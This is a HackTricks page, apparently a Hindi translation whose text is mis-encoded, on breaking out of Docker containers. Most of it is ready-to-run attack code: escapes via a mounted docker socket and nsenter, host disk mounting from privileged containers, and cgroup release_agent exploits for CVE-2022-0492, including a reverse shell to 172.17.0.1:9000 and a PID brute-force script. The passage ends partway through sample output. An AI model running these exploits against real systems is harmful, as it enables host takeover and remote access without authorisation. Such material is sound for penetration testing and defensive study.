# Docker Breakout / Privilege Escalation

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ **рдореБрдЭреЗ рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЯреВрд▓реНрд╕ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рд╡рд░реНрдХрдлреНрд▓реЛрдЬрд╝ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВ рдФрд░ рдСрдЯреЛрдореЗрдЯ рдХрд░реЗрдВ**ред\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдПрдиреНрдпреБрдореЗрд░реЗрд╢рди рдФрд░ рдПрд╕реНрдХреЗрдк

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): рдпрд╣ рднреА **рдХрдВрдЯреЗрдирд░реНрд╕ рдХрд╛ рдПрдиреНрдпреБрдореЗрд░реЗрд╢рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): рдпрд╣ рдЯреВрд▓ рдХрдВрдЯреЗрдирд░ рдХрд╛ рдПрдиреНрдпреБрдореЗрд░реЗрд╢рди рдХрд░рдиреЗ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдПрд╕реНрдХреЗрдк рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдлреА **рдЙрдкрдпреЛрдЧреА рд╣реИ**
* [**amicontained**](https://github.com/genuinetools/amicontained): рдХрдВрдЯреЗрдирд░ рдХреЗ рдкрд╛рд╕ рдХреМрди рд╕реЗ рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдЯреВрд▓, рддрд╛рдХрд┐ рдЗрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдЦреЛрдЬреЗ рдЬрд╛ рд╕рдХреЗрдВ
* [**deepce**](https://github.com/stealthcopter/deepce): рдХрдВрдЯреЗрдирд░реНрд╕ рдХрд╛ рдПрдиреНрдпреБрдореЗрд░реЗрд╢рди рдХрд░рдиреЗ рдФрд░ рдЙрдирд╕реЗ рдПрд╕реНрдХреЗрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреВрд▓
* [**grype**](https://github.com/anchore/grype): рдЗрдореЗрдЬ рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдореЗрдВ рдореМрдЬреВрдж CVEs рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

## рдорд╛рдЙрдВрдЯреЗрдб Docker Socket Escape

рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ **docker socket рдорд╛рдЙрдВрдЯреЗрдб рд╣реИ** рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рдкрд╛рдПрдВрдЧреЗред\
рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдЙрди рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░реНрд╕ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ рдбреЙрдХрд░ рдбреЗрдореЙрди рд╕реЗ рдЬреБрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ рдХреНрд░рд┐рдпрд╛рдПрдВ рдХреА рдЬрд╛ рд╕рдХреЗрдВред
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рдбреЙрдХрд░ рдбреЗрдорди рд╕реЗ рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдп рдбреЙрдХрд░ рдХрдорд╛рдВрдбреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
рдпрджрд┐ **docker socket рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рд╕реНрдерд╛рди рдкрд░ рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **`docker`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ **`-H unix:///path/to/docker.sock`** рдХреЗ рд╕рд╛рдеред
{% endhint %}

Docker daemon [рдкреЛрд░реНрдЯ рдкрд░ рднреА рд╕реБрди рд╕рдХрддрд╛ рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) рдпрд╛ Systemd-рдЖрдзрд╛рд░рд┐рдд рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░, Docker daemon рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж Systemd socket `fd://` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

{% hint style="info" %}
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрдиреНрдп рдЙрдЪреНрдЪ-рд╕реНрддрд░реАрдп runtimes рдХреЗ runtime sockets рдкрд░ рдзреНрдпрд╛рди рджреЗрдВ:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilities Abuse Escape

рдЖрдкрдХреЛ рдХрдВрдЯреЗрдирд░ рдХреА capabilities рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП, рдпрджрд┐ рдЗрд╕рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рдмрдЪ рд╕рдХрддреЗ рд╣реИрдВ: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

рдЖрдк **рдкрд╣рд▓реЗ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдгреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╛: рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд░реНрддрдорд╛рди рдХрдВрдЯреЗрдирд░ capabilities рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
capsh --print
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрд░ рдЖрдк **рд▓рд┐рдирдХреНрд╕ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдХреИрд╕реЗ рдЙрдирдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ/рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрдВрдЯреЗрдирд░реЛрдВ рд╕реЗ рдмрдЪрдирд╛

рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрдВрдЯреЗрдирд░ рдХреЛ `--privileged` рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд░рдХреНрд╖рд╛рдУрдВ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдХреЗ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label=disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `/dev рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ`

`--privileged` рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЪрд┐рдВрддрд╛рдПрдВ рдкреИрджрд╛ рд╣реЛрддреА рд╣реИрдВ, рдФрд░ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдХреЗ рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп, рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рд╕рднреА рдЙрдкрдХрд░рдгреЛрдВ рддрдХ рдкреВрд░реНрдг рдкрд╣реБрдВрдЪ рд╣реЛрддреА рд╣реИ рдФрд░ seccomp, AppArmor, рдФрд░ рд▓рд┐рдирдХреНрд╕ рдХреНрд╖рдорддрд╛рдУрдВ рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреА рдХрдореА рд╣реЛрддреА рд╣реИред рдЖрдк рдЗрд╕ рдкреГрд╖реНрда рдкрд░ `--privileged` рдХреЗ рд╕рднреА рдкреНрд░рднрд╛рд╡реЛрдВ рдХреЛ **рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд + hostPID

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк рд╕рд┐рд░реНрдл **рд╣реЛрд╕реНрдЯ рдореЗрдВ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдирд╛рдорд╕реНрдерд╛рди рдореЗрдВ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ рдХрд┐ init (pid:1) рдмрд╕ рдЪрд▓рд╛рдХрд░: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

рдЗрд╕реЗ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд

рдХреЗрд╡рд▓ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдЖрдк **рд╣реЛрд╕реНрдЯ рдХреА рдбрд┐рд╕реНрдХ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ **release\_agent рдпрд╛ рдЕрдиреНрдп рдПрд╕реНрдХреЗрдкреНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдЪ рдирд┐рдХрд▓рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдмрд╛рдпрдкрд╛рд╕ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ рдПрдХ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдирд┐рдореНрди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### рдорд╛рдЙрдВрдЯрд┐рдВрдЧ рдбрд┐рд╕реНрдХ - Poc1

рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ **fdisk -l** рдЬреИрд╕реЗ рдХрдорд╛рдВрдб рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрдВрдЧреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдбреЙрдХрд░ рдХрдорд╛рдВрдб рдореЗрдВ рдЬрд╣рд╛рдВ `--privileged` рдпрд╛ `--device=/dev/sda1` рдлреНрд▓реИрдЧ рдХреИрдкреНрд╕ рдХреЗ рд╕рд╛рде рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реИ, рд╣реЛрд╕реНрдЯ рдбреНрд░рд╛рдЗрд╡ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

рддреЛ рд╣реЛрд╕реНрдЯ рдорд╢реАрди рдкрд░ рдХрдмреНрдЬрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╕рд░рд▓ рд╣реИ:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
рдФрд░ рд╡реЛрдЗрд▓рд╛! рдЖрдк рдЕрдм рд╣реЛрд╕реНрдЯ рдХреА рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ `/mnt/hola` рдлреЛрд▓реНрдбрд░ рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

#### рдбрд┐рд╕реНрдХ рдорд╛рдЙрдВрдЯрд┐рдВрдЧ - Poc2

рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреНрд▓рд╕реНрдЯрд░ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп hostPath рд╡реЙрд▓реНрдпреВрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдореВрд▓ рд╣реЛрд╕реНрдЯ OS рддрдХ рдЖрдЧреЗ рдХреА рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдиреАрдЪреЗ рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рдЪреАрдЬреЗрдВ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдЗрд╕ рд╣рдорд▓рд╛рд╡рд░ рд╡реЗрдХреНрдЯрд░ рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХреЗрдВ:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдПрд╕реНрдХреЗрдк рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдореМрдЬреВрджрд╛ release\_agent рдХрд╛ ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="рдкреНрд░рд╛рд░рдВрднрд┐рдХ PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдПрд╕реНрдХреЗрдк рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдмрдирд╛рдП рдЧрдП release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="рджреВрд╕рд░рд╛ PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

рддрдХрдиреАрдХ рдХреА **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдпрд╣рд╛рдБ рдкрд╛рдПрдВ:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдПрд╕реНрдХреЗрдк рд░рд┐рд▓реАрдЬрд╝_рдПрдЬреЗрдВрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдмрд┐рдирд╛ рд╕рд╛рдкреЗрдХреНрд╖ рдкрде рдХреЛ рдЬрд╛рдиреЗ - PoC3

рдкрд┐рдЫрд▓реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдореЗрдВ **рд╣реЛрд╕реНрдЯ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рдХрдВрдЯреЗрдирд░ рдХрд╛ рд╕рдВрдкреВрд░реНрдг рдкрде рдкреНрд░рдХрдЯ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рд╣рдореЗрд╢рд╛ рдорд╛рдорд▓рд╛ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдЬрдм рдЖрдк **рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдХрдВрдЯреЗрдирд░ рдХрд╛ рд╕рдВрдкреВрд░реНрдг рдкрде рдирд╣реАрдВ рдЬрд╛рдирддреЗ рд╣реИрдВ** рддрдм рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд PoC рдХреЛ рдПрдХ privileged container рдХреЗ рднреАрддрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдкрд░ рдЖрдкрдХреЛ рдЗрд╕реА рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рдорд┐рд▓рдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
